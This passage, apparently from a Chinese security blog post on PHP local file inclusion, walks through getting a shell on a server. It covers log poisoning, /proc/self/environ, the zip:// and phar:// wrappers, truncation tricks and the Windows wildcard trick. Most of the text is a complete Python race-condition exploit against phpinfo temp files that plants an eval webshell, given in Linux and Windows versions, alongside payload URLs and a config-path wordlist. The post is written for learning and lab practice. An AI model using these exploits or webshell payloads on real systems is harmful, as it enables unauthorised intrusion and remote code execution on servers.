de/conn.php../include/conn.php../../../include/conn.php/include/conn.asp./include/conn.asp../../include/conn.asp../include/conn.asp../../../include/conn.asp/include/config.inc.php./include/config.inc.php../../include/config.inc.php../include/config.inc.php../../../include/config.inc.php/inc/config.php../../inc/config.php../inc/config.php../../../inc/config.php/inc/config.inc.php./inc/config.inc.php../../inc/config.inc.php../inc/config.inc.php../../../inc/config.inc.php/inc/conn.php./inc/conn.php../../inc/conn.php../inc/conn.php../../../inc/conn.php/inc/conn.asp./inc/conn.asp../../inc/conn.asp../inc/conn.asp../../../inc/conn.asp/inc/config.inc.php./inc/config.inc.php../../inc/config.inc.php../inc/config.inc.php../../../inc/config.inc.php/index.php./index.php../../index.php../index.php../../../index.php/index.asp./index.asp../../index.asp../index.asp../../../index.asp</code></pre><p><strong>1.包含日志文件</strong></p><p>通过burp访问:</p><pre><code class="shell">1.http://127.0.0.1:8081/test.php?file=&lt;?php phpinfo();?&gt;2.http://127.0.0.1:8081/test.php?file=../../../../../../../var/log/apache2/access.log</code></pre><p><strong>2.包含系统环境</strong></p><p>linux(FreeBSD是没有这个的)下的/proc/self/environ 会获取用户的UA</p><pre><code class="shell">VM-221-25-ubuntu:/var/log# ls -al /proc/self/environ-r-------- 1 root root 0 Jun 30 09:51 /proc/self/environ</code></pre><p>这个其实有点意思,应该实战可能会出现的情景,个人认为应该是httpd或者php的权限太高导致的。</p><p>Exploiting LFI to RCE /proc/self/environ with burpsuite:<a href="https://www.youtube.com/watch?v=dlh0ogYy9ys">https://www.youtube.com/watch?v=dlh0ogYy9ys</a></p><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><p>这个实战性还是很强的,所以这里我进行演示下,在默认phpstudy安装环境下如何实现getshell</p><p>默认安装的时候是没有开启日志记录功能的也就是不存在 <code>access.log</code></p><p>但是默认存在php error log</p><p><code>C:\phpStudy\Apache\logs\error.log</code>是存在的</p><p>不能在浏览器上直接访问,因为浏览器会自动urlencode编码特殊字符,所以利用的时候要用burp去操作</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125193307776.png" alt="image-20221125193307776"></p><p><strong>1.访问不存在带有payload的文件</strong></p><p>(我这里访问403后apache没有记录日志，晕)</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125195055671.png" alt="image-20221125195055671"></p><p>然后查看下</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125195753881.png" alt="image-20221125195753881"></p><p>发现成功写入</p><pre><code class="php">http://127.0.0.1/index.php?file=C:\phpStudy\Apache\logs\error.log   //然后直接getshell</code></pre><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125195838342.png" alt="image-20221125195838342"></p><h3 id="存在上传图片等功能结合文件包含getshell"><a href="#存在上传图片等功能结合文件包含getshell" class="headerlink" title="存在上传图片等功能结合文件包含getshell"></a>存在上传图片等功能结合文件包含getshell</h3><p><strong>情况1 任意文件包含</strong></p><pre><code class="php">&lt;?phphighlight_file(__FILE__);header(&quot;Content-Type: text/html; charset=utf-8&quot;);$file = $_GET[&#39;file&#39;];include($file);?&gt;</code></pre><p>还是这种情况(任意文件可控包含),这个时候如果可以上传文件比如图片之类的,直接包含起来就行了。</p><p>比如我们上传一个HY.png</p><p>内容:</p><pre><code class="php">&lt;?php phpinfo();?&gt;</code></pre><p>我们包含这个图片:</p><pre><code class="php">http://193.43.142.8/sakura.php?file=HY.png</code></pre><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125212231293.png" alt="image-20221125212231293"></p><p><strong>情况2 限制后缀</strong></p><pre><code class="php">&lt;?phphighlight_file(__FILE__);header(&quot;Content-Type: text/html; charset=utf-8&quot;);$file = $_GET[&#39;file&#39;].&quot;.php&quot;; //限制只能包含php后缀的文件。include($file);?&gt;</code></pre><p>因为上传点只允许上传<code>.jpg .png .gif</code>后缀的图片,比如我们上传了 <code>HY.jpg</code></p><p>内容还是和上面一样，我们尝试包含一下</p><p>此时就无法包含成功了</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125212513234.png" alt="image-20221125212513234"></p><p>因为拼接之后就是: <code>HY.jpg.php</code>这个文件肯定不存在</p><p>这个时候我们就可以利用伪协议来进行绕过。</p><p>我们构造一个zip压缩包:</p><p>就是写一个shell.php -&gt; zip压缩得到压缩包,然后改名为shell.png,去上传</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125213118153.png" alt="image-20221125213118153"></p><p>然后修改后缀为shell.png,我们假设我们把这个图片上传到了服务器，我们来用一些协议去包含它</p><ol><li>利用**<code>zip://</code>协议**</li></ol><blockquote><p>zip://与phar://的使用类似，但是需要绝对路径， zip文件后面要跟%23加zip文件里的文件</p></blockquote><p>windows可用</p><p>可构造出路径:</p><pre><code class="php">http://127.0.0.1/index.php?file=zip://E:/phpstudy_pro/WWW/shell.png%23shell</code></pre><p>我用linux尝试了但是没有包含成功</p><p>2.利用**<code>phar://</code>协议**</p><p>windows和Linux都可用</p><p>这个也可以用前面的那个压缩包,不过不需要#去分开压缩包里面的内容了,<code>phar://</code>协议是根据文件头去判断是不是压缩文件的,所以shell.png不会影响正常解析出这个压缩包。(这个在CTF比赛中很常见)</p><pre><code class="php">http://127.0.0.1/index.php?file=phar://shell.png/shell</code></pre><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125214942739.png" alt="image-20221125214942739"></p><p>这个协议我在linux上也测试成功了，猜测是绝对路径出了问题</p><pre><code class="php">http://193.43.142.8/sakura.php?file=phar://shell.png/shell</code></pre><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125215039282.png" alt="image-20221125215039282"></p><p><strong>3.利用截断绕过(老版本PHP)</strong></p><p>这个以前还是很常见的,现在的话,利用很有限,这里就不去搭建环境测试了。<br> 引用l3mon师傅博客的写的总结。</p><blockquote><ol><li>%00截断<br> /etc/passwd%00<br> (需要 magic_quotes_gpc=off，PHP小于5.3.4有效)</li><li>%00截断目录遍历：<br> /var/www/%00<br> (需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</li><li>路径长度截断：<br> /etc/passwd/././././././.[…]/./././././.<br> (php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)</li><li>点号截断：<br> /boot.ini/………[…]…………<br> (php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</li></ol></blockquote><p>现在很少见版本这么低的了，就不复现辣</p><h3 id="phpinfo-LFI-本地文件包含临时文件getshell"><a href="#phpinfo-LFI-本地文件包含临时文件getshell" class="headerlink" title="phpinfo-LFI 本地文件包含临时文件getshell"></a>phpinfo-LFI 本地文件包含临时文件getshell</h3><p>phpinfo(); 可以给我们提供什么信息?</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125215626807.png" alt="image-20221125215626807"></p><p>开头的内容能给我门提供很多信息(我画的红框里面)</p><p>常用:</p><blockquote><p>system info  详细的操作系统信息 确定window  or linux<br> Registered PHP Streams and filters  注册的php过滤器和流协议<br> extension_dir php扩展的路径<br> short_open_tag     &lt;?= 和 &lt;? echo 等价<br> disable_function 禁用函数<br> open_basedir 将用户可操作的文件限制在某目录下<br> SERVER_ADDR  真实ip<br> DOCUMENT_ROOT web根目录<br> _FILES[“file”] 可以获取临时文件名字和路径<br> session 可以查看session的相关配置</p></blockquote><p>原理非常简单:</p><p>我们构造一个上传表单的时候,php也会生成一个对应的临时文件,这个文件的相关内容可以在phpinfo()的<code>_FILE[&quot;file&quot;]</code>查看到,但是临时文件很快就会被删除,所以我们赶在临时文件被删除之前,包含临时文件就可以getshell了。</p><p>php处理流程timeline如下:</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221125215748773.png" alt="image-20221125215748773"></p><p><strong>1.我们来了解一下PHP临时文件的机制:</strong></p><p>在PHP中可以使用POST方法或者PUT方法进行文本和二进制文件的上传。上传的文件信息会保存在全局变量$_FILES里。</p><p>$_FILES超级全局变量很特殊，他是预定义超级全局数组中唯一的二维数组。其作用是存储各种与上传文件有关的信息，这些信息对于通过PHP脚本上传到服务器的文件至关重要。</p><pre><code class="php">$_FILES[&#39;userfile&#39;][&#39;name&#39;] 客户端文件的原名称。$_FILES[&#39;userfile&#39;][&#39;type&#39;] 文件的 MIME 类型，如果浏览器提供该信息的支持，例如&quot;image/gif&quot;。$_FILES[&#39;userfile&#39;][&#39;size&#39;] 已上传文件的大小，单位为字节。$_FILES[&#39;userfile&#39;][&#39;tmp_name&#39;] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，默认是/tmp目录。$_FILES[&#39;userfile&#39;][&#39;error&#39;] 该文件上传的错误代码，上传成功其值为0，否则为错误信息。</code></pre><p>在临时文件包含漏洞中<code>$_FILES[&#39;userfile&#39;][&#39;name&#39;]</code>这个变量值的获取很重要，因为临时文件的名字都是由随机函数生成的，只有知道文件的名字才能正确的去包含它。</p><p><strong>2.存储目录</strong></p><p>文件被上传后，默认会被存储到服务端的默认临时目录中，该临时目录由php.ini的<code>upload_tmp_dir</code>属性指定，假如<code>upload_tmp_dir</code>的路径不可写，PHP会上传到系统默认的临时目录中。</p><p>不同系统服务器常见的临时文件默认存储目录，了解系统的默认存储路径很重要，因为在很多时候服务器都是按照默认设置来运行的。</p><pre><code class="shell">Linux目录Linxu系统服务的临时文件主要存储在根目录的tmp文件夹下，具有一定的开放权限。/tmp/Windows目录Windows系统服务的临时文件主要存储在系统盘Windows文件夹下，具有一定的开放权限。C:/Windows/C:/Windows/Temp/</code></pre><p><strong>3.命名规则</strong></p><p>服务器上的临时文件的文件名都是随机生成的，了解不同系统服务器对临时文件的命名规则很重要，因为有时候对于临时文件我们需要去爆破，此时我们必须知道它的命名规则是什么。</p><p>可以通过phpinfo来查看临时文件的信息。</p><p><strong>存储在服务器上的临时文件的文件名都是随机生成的，了解不同系统服务器对临时文件的命名规则很重要，因为有时候对于临时文件我们需要去爆破，此时我们必须知道它的命名规则是什么。</strong></p><p>可以通过phpinfo来查看临时文件的信息。</p><p><strong>(1)Linux Temporary File</strong></p><p>Linux临时文件主要存储在<code>/tmp/</code>目录下，格式通常是（<code>/tmp/php[6个随机字符]</code>）</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221126162746868.png" alt="image-20221126162746868"></p><p><strong>(2)Windows Temporary File</strong></p><p>Windows临时文件主要存储在<code>C:/Windows/</code>目录下，格式通常是（<code>C:/Windows/php[4个随机字符].tmp</code>）</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221126162905801.png" alt="image-20221126162905801"></p><p>PHPINFO特性</p><p><strong>通过上面的介绍，服务器上存储的临时文件名是随机的，这就很难获取其真实的文件名。不过，如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。</strong></p><p>虽说这个漏洞出现的很早(2011年，国外的安全研究人员将这种攻击手法进行卡了公布)，不过这个技巧确实是个很经典的列子，不会被遗忘的。</p><p><strong>4.漏洞分析</strong></p><p>当我们在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件。<strong>文件名可以在<code>$_FILES</code>变量中找到</strong>。这个临时文件，在请求结束后就会被删除。</p><p><strong>利用phpinfo的特性可以很好的帮助我们，因为phpinfo页面会将当前请求上下文中所有变量（所有数据）都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到<code>$_FILES</code>变量的内容，拿到 临时文件变量名 之后，就可以进行包含执行我们传入的恶意代码。</strong></p><p><strong>5.漏洞利用</strong></p><p><strong>利用条件</strong>:几乎通杀</p><p><strong>测试脚本</strong></p><p>编写脚本，上传文件探测是否存在phpinfo包含临时文件的信息。</p><pre><code class="php">import requestsfiles = &#123;  &#39;file&#39;: (&quot;aa.txt&quot;,&quot;ssss&quot;)&#125;url = &quot;http://x.x.x.x/phpinfo.php&quot;r = requests.post(url=url, files=files, allow_redirects=False)print(r.text)</code></pre><p>运行脚本向服务器发出请求可以看到回显中有如下内容</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221126162746868.png" alt="image-20221126162746868"></p><p>windows同理</p><p><strong>利用原理</strong>:</p><p><strong>验证了phpinfo的特性确实存在，所以在文件包含漏洞找不到可利用的文件时，我们就可以利用这一特性，找到并提取临时文件名，然后包含之即可Getshell。</strong></p><p><strong>但文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。</strong>但是在第一个请求结束，临时文件就被删除了，第二个请求自然也就无法进行包含。</p><p><strong>利用过程</strong>:</p><p>这个时候就需要用到条件竞争，具体原理和过程如下：</p><p>（1）发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据</p><p>（2）因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大</p><p>（3）php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接</p><p>（4）所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包</p><p>（5）此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除</p><p>（6）利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell</p><p><strong>Getshell脚本</strong>:</p><p>利用p牛的代码，不用重复的造轮子，直接更改脚本主要的几个地方就可以成功运行利用，如<strong>上传的恶意文件内容</strong>、<strong>phpinfo.php</strong>和<strong>index.php</strong>相应文件的文件名和位置、<strong>系统临时文件写入目录</strong>等</p><p><strong>Linux测试</strong></p><p>exp.py</p><pre><code class="python">#!/usr/bin/python# coding:utf-8import sysimport threadingimport socketdef setup(host, port):    TAG=&quot;Security Test&quot;    PAYLOAD=&quot;&quot;&quot;%s\r&lt;?php $c=fopen(&#39;/tmp/HY666.php&#39;,&#39;w&#39;);fwrite($c,&#39;&lt;?php eval($_REQUEST[HY]);?&gt;&#39;);?&gt;\r&quot;&quot;&quot; % TAG    REQ1_DATA=&quot;&quot;&quot;-----------------------------7dbff1ded0714\rContent-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\rContent-Type: text/plain\r\r%s-----------------------------7dbff1ded0714--\r&quot;&quot;&quot; % PAYLOAD    padding=&quot;A&quot; * 5000    # 这里需要修改为phpinfo.php的地址    REQ1=&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;+padding+&quot;&quot;&quot; HTTP/1.1\rCookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;+padding+&quot;&quot;&quot;\rHTTP_ACCEPT: &quot;&quot;&quot; + padding + &quot;&quot;&quot;\rHTTP_USER_AGENT: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\rHTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\rHTTP_PRAGMA: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\rContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\rContent-Length: %s\rHost: %s\r\r%s&quot;&quot;&quot; %(len(REQ1_DATA),host,REQ1_DATA)    #modify this to suit the LFI script    LFIREQ=&quot;&quot;&quot;GET /sakura.php?file=%s HTTP/1.1\rUser-Agent: Mozilla/4.0\rProxy-Connection: Keep-Alive\rHost: %s\r\r\r&quot;&quot;&quot;    return (REQ1, TAG, LFIREQ)def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.connect((host, port))    s2.connect((host, port))    s.send(phpinforeq)    d = &quot;&quot;    while len(d) &lt; offset:        d += s.recv(offset)    try:        i = d.find(&quot;[tmp_name] =&amp;gt; &quot;)        fn = d[i+17:i+31]        print fn    except ValueError:        return None    s2.send(lfireq % (fn, host))    print lfireq % (fn, host) #debug调试结果    d = s2.recv(4096)    print d #查看回显是否成功    s.close()    s2.close()    if d.find(tag) != -1:        return fncounter=0class ThreadWorker(threading.Thread):    def __init__(self, e, l, m, *args):        threading.Thread.__init__(self)        self.event = e        self.lock =  l        self.maxattempts = m        self.args = args    def run(self):        global counter        while not self.event.is_set():            with self.lock:                if counter &gt;= self.maxattempts:                    return                counter+=1            try:                x = phpInfoLFI(*self.args)                if self.event.is_set():                    break                if x:                    print &quot;\nGot it! Shell created in /tmp/g&quot;                    self.event.set()            except socket.error:                returndef getOffset(host, port, phpinforeq):    &quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.connect((host,port))    s.send(phpinforeq)    d = &quot;&quot;    while True:        i = s.recv(4096)        d+=i        if i == &quot;&quot;:            break        # detect the final chunk        if i.endswith(&quot;0\r\n\r\n&quot;):            break    s.close()    i = d.find(&quot;[tmp_name] =&amp;gt; &quot;)    if i == -1:        raise ValueError(&quot;No php tmp_name in phpinfo output&quot;)    print &quot;found %s at %i&quot; % (d[i:i+10],i)    # padded up a bit    return i+256def main():    print &quot;LFI With PHPInfo()&quot;    print &quot;-=&quot; * 30    if len(sys.argv) &lt; 2:        print &quot;Usage: %s host [port] [threads]&quot; % sys.argv[0]        sys.exit(1)    try:        host = socket.gethostbyname(sys.argv[1])    except socket.error, e:        print &quot;Error with hostname %s: %s&quot; % (sys.argv[1], e)        sys.exit(1)    port=80    try:        port = int(sys.argv[2])    except IndexError:        pass    except ValueError, e:        print &quot;Error with port %d: %s&quot; % (sys.argv[2], e)        sys.exit(1)    poolsz=10    try:        poolsz = int(sys.argv[3])    except IndexError:        pass    except ValueError, e:        print &quot;Error with poolsz %d: %s&quot; % (sys.argv[3], e)        sys.exit(1)    print &quot;Getting initial offset...&quot;,    reqphp, tag, reqlfi = setup(host, port)    offset = getOffset(host, port, reqphp)    sys.stdout.flush()    maxattempts = 1000    e = threading.Event()    l = threading.Lock()    print &quot;Spawning worker pool (%d)...&quot; % poolsz    sys.stdout.flush()    tp = []    for i in range(0,poolsz):        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))    for t in tp:        t.start()    try:        while not e.wait(1):            if e.is_set():                break            with l:                sys.stdout.write( &quot;\r% 4d / % 4d&quot; % (counter, maxattempts))                sys.stdout.flush()                if counter &gt;= maxattempts:                    break        print        if e.is_set():            print &quot;Woot!  \m/&quot;        else:            print &quot;:(&quot;    except KeyboardInterrupt:        print &quot;\nTelling threads to shutdown...&quot;        e.set()    print &quot;Shuttin&#39; down...&quot;    for t in tp:        t.join()if __name__==&quot;__main__&quot;:    main()</code></pre><p>可以用inotifywait命令来监控对tmp文件和目录的访问记录</p><pre><code class="shell">apt install inotify-toolsinotifywait -mrq -e &#39;create,delete,close_write,attrib,moved_to&#39; --timefmt &#39;%Y-%m-%d %H:%M&#39; --format &#39;%T %w%f %e&#39; /tmp/</code></pre><p>然后修改脚本内容后运行:</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221127012226499.png" alt="image-20221127012226499"></p><p>但是我这里运行后并没有生成文件，郁闷，看监控，每次tmp文件也正常生成的</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221127012329797.png" alt="image-20221127012329797"></p><p>查看脚本debug，也是正常的</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221127023204975.png" alt="image-20221127023204975"></p><p>很奇怪，我自己尝试了下，发现/tmp/目录下的文件无法包含成功??(这里对111.php写入了phpinfo函数)</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221127023414471.png" alt="image-20221127023414471"></p><p>可能是我之前搞得一些东西，对目录做了限制，不过大体思路知道就没问题辣!</p><p><strong>windows</strong></p><p>同理，修改脚本文件生成路径即可</p><pre><code class="php">#!/usr/bin/python# coding:utf-8import sysimport threadingimport socketdef setup(host, port):    TAG=&quot;Security Test&quot;    PAYLOAD=&quot;&quot;&quot;%s\r&lt;?php $c=fopen(&#39;C:\Windows\Temp\dd.php&#39;,&#39;w&#39;);fwrite($c,&#39;&lt;?php eval($_REQUEST[HY]);?&gt;&#39;);?&gt;\r&quot;&quot;&quot; % TAG    REQ1_DATA=&quot;&quot;&quot;-----------------------------7dbff1ded0714\rContent-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\rContent-Type: text/plain\r\r%s-----------------------------7dbff1ded0714--\r&quot;&quot;&quot; % PAYLOAD    padding=&quot;A&quot; * 5000    # 这里需要修改为phpinfo.php的地址    REQ1=&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;+padding+&quot;&quot;&quot; HTTP/1.1\rCookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;+padding+&quot;&quot;&quot;\rHTTP_ACCEPT: &quot;&quot;&quot; + padding + &quot;&quot;&quot;\rHTTP_USER_AGENT: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\rHTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\rHTTP_PRAGMA: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\rContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\rContent-Length: %s\rHost: %s\r\r%s&quot;&quot;&quot; %(len(REQ1_DATA),host,REQ1_DATA)    #modify this to suit the LFI script    LFIREQ=&quot;&quot;&quot;GET /index.php?file=%s HTTP/1.1\rUser-Agent: Mozilla/4.0\rProxy-Connection: Keep-Alive\rHost: %s\r\r\r&quot;&quot;&quot;    return (REQ1, TAG, LFIREQ)def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.connect((host, port))    s2.connect((host, port))    s.send(phpinforeq)    d = &quot;&quot;    while len(d) &lt; offset:        d += s.recv(offset)    try:        i = d.find(&quot;[tmp_name] =&amp;gt; &quot;)        fn = d[i+17:i+39]        print fn    except ValueError:        return None    s2.send(lfireq % (fn, host))    # print lfireq % (fn, host) #debug调试结果    d = s2.recv(4096)    # print d #查看回显是否成功    s.close()    s2.close()    if d.find(tag) != -1:        return fncounter=0class ThreadWorker(threading.Thread):    def __init__(self, e, l, m, *args):        threading.Thread.__init__(self)        self.event = e        self.lock =  l        self.maxattempts = m        self.args = args    def run(self):        global counter        while not self.event.is_set():            with self.lock:                if counter &gt;= self.maxattempts:                    return                counter+=1            try:                x = phpInfoLFI(*self.args)                if self.event.is_set():                    break                if x:                    print &quot;\nGot it! Shell created in /tmp/g&quot;                    self.event.set()            except socket.error:                returndef getOffset(host, port, phpinforeq):    &quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.connect((host,port))    s.send(phpinforeq)    d = &quot;&quot;    while True:        i = s.recv(4096)        d+=i        if i == &quot;&quot;:            break        # detect the final chunk        if i.endswith(&quot;0\r\n\r\n&quot;):            break    s.close()    i = d.find(&quot;[tmp_name] =&amp;gt; &quot;)    if i == -1:        raise ValueError(&quot;No php tmp_name in phpinfo output&quot;)    print &quot;found %s at %i&quot; % (d[i:i+10],i)    # padded up a bit    return i+256def main():    print &quot;LFI With PHPInfo()&quot;    print &quot;-=&quot; * 30    if len(sys.argv) &lt; 2:        print &quot;Usage: %s host [port] [threads]&quot; % sys.argv[0]        sys.exit(1)    try:        host = socket.gethostbyname(sys.argv[1])    except socket.error, e:        print &quot;Error with hostname %s: %s&quot; % (sys.argv[1], e)        sys.exit(1)    port=80    try:        port = int(sys.argv[2])    except IndexError:        pass    except ValueError, e:        print &quot;Error with port %d: %s&quot; % (sys.argv[2], e)        sys.exit(1)    poolsz=10    try:        poolsz = int(sys.argv[3])    except IndexError:        pass    except ValueError, e:        print &quot;Error with poolsz %d: %s&quot; % (sys.argv[3], e)        sys.exit(1)    print &quot;Getting initial offset...&quot;,    reqphp, tag, reqlfi = setup(host, port)    offset = getOffset(host, port, reqphp)    sys.stdout.flush()    maxattempts = 1000    e = threading.Event()    l = threading.Lock()    print &quot;Spawning worker pool (%d)...&quot; % poolsz    sys.stdout.flush()    tp = []    for i in range(0,poolsz):        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))    for t in tp:        t.start()    try:        while not e.wait(1):            if e.is_set():                break            with l:                sys.stdout.write( &quot;\r% 4d / % 4d&quot; % (counter, maxattempts))                sys.stdout.flush()                if counter &gt;= maxattempts:                    break        print        if e.is_set():            print &quot;Woot!  \m/&quot;        else:            print &quot;:(&quot;    except KeyboardInterrupt:        print &quot;\nTelling threads to shutdown...&quot;        e.set()    print &quot;Shuttin&#39; down...&quot;    for t in tp:        t.join()if __name__==&quot;__main__&quot;:    main()</code></pre><p><strong>记得，一定要修改切片位置，不然哭死</strong></p><pre><code class="shell">python2 exp.py 127.0.0.1 80 200</code></pre><p>然后成功在目录找到了这个文件</p><p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221127022812771.png" alt="image-20221127022812771"></p><h3 id="Windows-通配符妙用"><a href="#Windows-通配符妙用" class="headerlink" title="Windows 通配符妙用"></a>Windows 通配符妙用</h3><p><code>phpinfo-LFI 本地文件包含临时文件getshell</code>中的利用方法需要两个条件：</p><ol><li>存在phpinfo等可以泄露临时文件名的页面</li><li>网络条件好，才能让Race Condition成功</li></ol><p>特别是第一个，现在很少有机会让我们在实战中找到phpinfo页面。但是如果目标操作系统是Windows，我们可以借助一些特殊的Tricks来实现文件包含的利用。</p><p>PHP在读取Windows文件时，会使用到<a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findfirstfileexw">FindFirstFileExW</a>这个Win32 API来查找文件，而这个API是支持使用通配符的：</p><blockquote><p><strong>lpFileName</strong></p><p>The directory or path, and the file name. The file name can include  wildcard characters, for example, an asterisk (*) or a question mark  (?).</p></blockquote><p>实际测试下来，PHP中星号和问号并不能直接作为通配符使用。</p><p>但我们在<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-_fsrtl_advanced_fcb_header-fsrtlisnameinexpression">MSDN官方文档</a>中还可以看到这样的说明：</p><blockquote><p>The following wildcard characters can be used in the pattern string.</p><p>Wildcard character  Meaning</p><p>***** (asterisk)               Matches zero or more characters.</p><p><strong>?</strong> (question mark)   Matches a single character.</p><p><strong>DOS_DOT</strong>                 Matches either a period or zero characters beyond the name string.</p><p><strong>DOS_QM</strong>                  Matches any single character or, upon encountering a period or end of name string, advances the  expression to the end of the set of contiguous DOS_QMs.</p><p><strong>DOS_STAR</strong>               Matches zero or more characters until encountering and matching the final . in the name.</p></blockquote><p>其中除了星号和问号外，还提到了三个特殊符号DOS_DOT、DOS_QM、DOS_STAR，虽然官方并没有在文档中给出他们对应的值具体是什么，但在ntifs.h头文件中还是能找到他们的定义：</p><pre><code>//  The following constants provide addition meta characters to fully//  support the more obscure aspects of DOS wild card processing.#define DOS_STAR        (L&#39;&lt;&#39;)#define DOS_QM          (L&#39;&gt;&#39;)#define DOS_DOT         (L&#39;&quot;&#39;)</code></pre><p>也就是说：</p><ul><li>DOS_STAR：即 <code>&lt;</code>，匹配0个以上的字符</li><li>DOS_QM：即<code>&gt;</code>，匹配1个字符</li><li>DOS_DOT：即<code>&quot;</code>，匹配点号</li></ul><p>这样，我们在Windows下，可以使用上述通配符来替代临时文件名中的随机字符串：<code>C:\Windows\Temp\php&lt;&lt;</code>。（由于Windows内部的一些不太明确的原因，这里一般需要用两个<code>&lt;</code>来匹配多个字符）</p><p>我们直接向含有文件包含漏洞的页面发送一个上传包：</p><p>表单如下:</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://127.0.0.1/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;file&quot; value=&quot;c:\Windows\php&lt;&lt;&quot; /&gt;    &lt;input type=&quot;file&quot; name=&quot;upload&quot; /&gt;    &lt;input type=&quot;submit&quot; value=&quot;submit&quot; 